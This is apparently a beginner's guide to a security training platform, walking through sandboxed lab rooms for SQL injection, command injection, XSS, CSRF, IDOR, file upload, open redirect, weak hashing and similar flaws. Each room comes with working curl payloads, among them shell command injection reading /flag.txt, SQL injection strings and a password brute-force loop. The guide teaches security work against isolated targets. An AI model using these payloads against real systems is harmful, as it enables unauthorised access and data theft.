# EdusKills Labs Guide

A beginner-friendly walkthrough of every lab room on the platform. Each entry explains **what the vulnerability is**, **why the code is broken**, and **exactly how to exploit it** from your attacker terminal.

## How every web-target lab works

Starting one of these rooms gives you **two containers**:

- **Attacker** — a terminal (ttyd) in your browser, with a `$TARGET_URL` environment variable already set
- **Target** — a private, vulnerable app only your attacker container can reach (never exposed to the internet)

Standard first move in every room:

```bash
echo $TARGET_URL
curl $TARGET_URL/
```

Once you find a flag (`flag{...}`), paste it into the room's flag-submission box on the dashboard.

---

## Core Injection & Output Flaws

### SQL Injection
**What's wrong:** The `/login` and `/product` endpoints build SQL queries by gluing your input directly into the query string, instead of using parameters. Anything you type becomes part of the actual SQL.

**Exploit it:**
```bash
# Challenge 1: log in as admin without the password
curl "$TARGET_URL/login?username=admin' --&password=x"

# Challenge 2: read a hidden table via UNION
curl "$TARGET_URL/product?id=0 UNION SELECT flag, 'x' FROM secrets"
```
The `'--` comments out the rest of the password check; the `UNION SELECT` appends rows from a table you were never supposed to see.

---

### SQL Injection (Blind)
**What's wrong:** Same flaw as above, but the app never shows you data — only `{"found": true/false}` or response timing. You have to ask yes/no questions and reconstruct the answer character by character.

**Exploit it (boolean-based):**
```bash
# Is the first character of the flag 'f'?
curl "$TARGET_URL/profile?id=0 OR (SELECT substr(flag_bool,1,1) FROM secrets)='f'"
# {"found": true} means yes — repeat for each position/letter
```

**Exploit it (time-based):** if you can't see *any* difference in output, use response delay instead:
```bash
curl "$TARGET_URL/profile-time?id=0 OR sleep(2)=0"
# response takes ~2s longer if the condition is true
```
This is genuinely tedious by hand — script a loop trying each letter at each position (that's exactly how tools like `sqlmap` automate it).

---

### Command Injection
**What's wrong:** The `/ping` endpoint runs your input as part of a real shell command (`ping -c 1 <your input>`). Shells treat `;`, `&&`, and `|` as "run another command here."

**Exploit it:**
```bash
curl -G "$TARGET_URL/ping" --data-urlencode "host=127.0.0.1; cat /flag.txt"
```
The flag file's contents ride along in the response after the ping output.

---

### Reflected XSS
**What's wrong:** `/greet?name=` prints your `name` value straight into the HTML with no escaping. If you send `<script>`, the browser would treat it as real code, not text.

**Exploit it:** since there's no real browser here, an `/report-to-admin` endpoint simulates one loading your link:
```bash
curl -X POST $TARGET_URL/report-to-admin \
  -H "Content-Type: application/json" \
  -d '{"payload": "<script>alert(1)</script>"}'
```
If the response confirms your script tag reached the page unescaped, you get the flag.

---

### Stored XSS
**What's wrong:** Like Reflected XSS, but your payload is saved permanently (a guestbook comment) instead of a one-off. Every future visitor would run it.

**Exploit it:**
```bash
curl -X POST $TARGET_URL/comment \
  -H "Content-Type: application/json" \
  -d '{"author": "me", "message": "<script>steal()</script>"}'

curl $TARGET_URL/admin-check
```
`/admin-check` simulates the admin viewing the guestbook and confirms your script would have run.

---

### DOM-Based XSS
**What's wrong:** This one's entirely client-side — a page's own JavaScript reads the URL fragment (`#...`, which never even reaches the server) and writes it straight into the page.

**Exploit it:**
```bash
curl "$TARGET_URL/verify.js"          # read the vulnerable client-side code first
curl -G "$TARGET_URL/admin-check-dom" --data-urlencode "hash=<script>alert(1)</script>"
```
`/admin-check-dom` simulates what your browser would have rendered from that URL fragment.

---

## Access Control & Session Flaws

### Broken Access Control (IDOR)
**What's wrong:** `/documents/{id}` only checks that *you're logged in*, never that you *own* the document you're asking for.

**Exploit it:**
```bash
curl -c cookies.txt -X POST $TARGET_URL/login \
  -H "Content-Type: application/json" -d '{"username":"alice","password":"alice123"}'

curl -b cookies.txt $TARGET_URL/documents/3   # admin's document, not yours
```

---

### CSRF (Cross-Site Request Forgery)
**What's wrong:** `/change-password` changes a password using only your session cookie — no re-entry of the old password, no anti-CSRF token. If a logged-in admin ever visits a link you control, their browser silently sends their cookie along with it.

**Exploit it:** `/simulate-admin-click` stands in for "the admin clicks your malicious link while already logged in":
```bash
curl -X POST $TARGET_URL/simulate-admin-click \
  -H "Content-Type: application/json" \
  -d '{"url": "/change-password?new_password=pwned123"}'

curl -X POST $TARGET_URL/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"pwned123"}'
```

---

### Weak Session IDs
**What's wrong:** Session cookies are just a sequential counter (`1`, `2`, `3`...), not random. The admin logged in before you and got session `1`.

**Exploit it:**
```bash
curl -H "Cookie: session=1" $TARGET_URL/flag
```
No login needed at all — you just guessed the admin's cookie.

---

### Authentication Bypass
**What's wrong:** `/account` trusts a `remember_me` cookie's value as your identity, with **zero verification** — no signature, nothing tying it to a real login.

**Exploit it:**
```bash
curl -H "Cookie: remember_me=admin" $TARGET_URL/account
```
You never logged in — you just told the server who you are, and it believed you.

---

### Brute Force
**What's wrong:** `/login` has no lockout, no rate limit, no delay after failed attempts — and the password is weak enough to guess quickly.

**Exploit it:**
```bash
for pw in password 123456 admin123 letmein123; do
  curl -s -X POST $TARGET_URL/login -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$pw\"}"
done
```

---

### API Abuse (Mass Assignment)
**What's wrong:** `PATCH /api/users/{id}` applies *every* field you send straight onto your account — including `role`, which should never be client-settable.

**Exploit it:**
```bash
curl -c cookies.txt -X POST $TARGET_URL/login \
  -H "Content-Type: application/json" -d '{"username":"alice","password":"alice123"}'

curl -b cookies.txt -X PATCH $TARGET_URL/api/users/1 \
  -H "Content-Type: application/json" -d '{"role": "admin"}'

curl -b cookies.txt $TARGET_URL/api/flag
```

---

## Input Validation & Configuration Flaws

### Local File Inclusion (LFI)
**What's wrong:** `/page?file=` glues your filename onto a directory path with no checks — `../` lets you walk out of that directory into anywhere else on disk.

**Exploit it:**
```bash
curl "$TARGET_URL/page?file=../secret.txt"
```

---

### Unrestricted File Upload
**What's wrong:** `/upload` saves any file you send with no type checking, and `/run/{filename}` will execute an uploaded file as a shell script.

**Exploit it:**
```bash
echo 'cat /flag.txt' > pwn.sh
curl -F "file=@pwn.sh" $TARGET_URL/upload
curl $TARGET_URL/run/pwn.sh
```

---

### Open Redirect
**What's wrong:** `/redirect?url=` sends visitors anywhere you tell it to, with no check that the destination is actually part of this site — the exact mechanism phishing links abuse ("trusted-looking link → attacker site").

**Exploit it:**
```bash
curl -i "$TARGET_URL/redirect?url=https://evil.example.com/phish"
```
Look for the `X-Redirect-Flag` response header — proof the redirect target was never validated.

---

### CSP Bypass
**What's wrong:** The page's `Content-Security-Policy` header looks strict (`script-src 'self'`), but also allows the `data:` scheme — meaning a `<script src="data:...">` tag would still run despite the policy.

**Exploit it:**
```bash
curl -i "$TARGET_URL/"   # inspect the Content-Security-Policy header
curl "$TARGET_URL/verify-bypass?src=data:text/javascript,alert(1)"
```

---

### CAPTCHA Bypass
**What's wrong:** `/change-password` is supposed to require solving a CAPTCHA first — but the check only runs if you *include* a `captcha_answer` field at all. Leave it out entirely, and the check never fires.

**Exploit it:**
```bash
curl -X POST $TARGET_URL/change-password \
  -H "Content-Type: application/json" -d '{"new_password": "x"}'
```
(No `captcha_answer` key in the JSON at all — not even an empty string.)

---

### Information Disclosure
**What's wrong:** The homepage's HTML source contains a developer comment mentioning a backup file that was never removed before deploying — and that file is still served with no access control.

**Exploit it:**
```bash
curl $TARGET_URL/          # read the HTML source, look for HTML comments
curl $TARGET_URL/backup.zip
```

---

## Cryptography & Client-Side Logic

### Cryptography (Weak Hashing)
**What's wrong:** A 4-digit PIN is "protected" by an unsalted MD5 hash. MD5 is fast and there are only 10,000 possible PINs — brute-forcing the whole keyspace takes well under a second.

**Exploit it:**
```bash
curl $TARGET_URL/secret-hash   # get the MD5 hash

# then, in the attacker terminal (python3 available in kali-terminal room):
python3 -c "
import hashlib, urllib.request
target = '<paste the hash here>'
for i in range(10000):
    pin = f'{i:04d}'
    if hashlib.md5(pin.encode()).hexdigest() == target:
        print(pin)
        break
"
curl "$TARGET_URL/verify-pin?pin=<cracked pin>"
```

---

### JavaScript Obfuscation
**What's wrong:** A client-side script computes a "secret" token using an algorithm that's just scrambled variable names, not real security. Reading the source (even obfuscated) reveals the exact steps.

**Exploit it:**
```bash
curl $TARGET_URL/verify.js      # read the algorithm: reverse the seed, shift each char +3, base64-encode
SEED=$(curl -s $TARGET_URL/challenge | grep -o '"seed":"[^"]*"' | cut -d'"' -f4)

# reimplement the same transform yourself (python shown here):
python3 -c "
import base64
seed = '$SEED'
rev = seed[::-1]
shifted = ''.join(chr(ord(c)+3) for c in rev)
print(base64.b64encode(shifted.encode('latin1')).decode())
"

curl -X POST $TARGET_URL/verify -H "Content-Type: application/json" \
  -d "{\"seed\": \"$SEED\", \"token\": \"<computed token>\"}"
```

---

## Terminal-Only Rooms (no target container)

### Linux Basics
Just a terminal — practice basic navigation (`ls`, `cd`, `cat`) to find a flag file somewhere in the workspace.

### Kali Linux Terminal
A Kali-based terminal with `nmap`, `netcat`, `python3`. Practice network scanning:
```bash
nmap -sn 172.0.0.0/24
```

### GUI Desktop Lab
A full browser (noVNC + Firefox) inside your dashboard — for labs that genuinely need a real browser (rendering, real cookies/JS execution) rather than curl. If the noVNC screen asks for a password, enter `money4band` (the underlying image's built-in default).

---

## General tips for beginners

- **Always start with recon:** `curl $TARGET_URL/` to read the homepage before trying anything else — it often hints at the vulnerable endpoint.
- **`curl -i`** shows response headers too — useful for CSRF, CSP, and Open Redirect labs.
- **`curl -c cookies.txt` / `-b cookies.txt`** saves and replays cookies across requests — needed for any lab with a login step.
- **`--data-urlencode`** lets you safely send special characters (spaces, `;`, `<`, `>`) in a URL without manually encoding them.
- If a payload doesn't work, check for typos in quoting — SQL/shell injection payloads are very sensitive to exact quote/space placement.
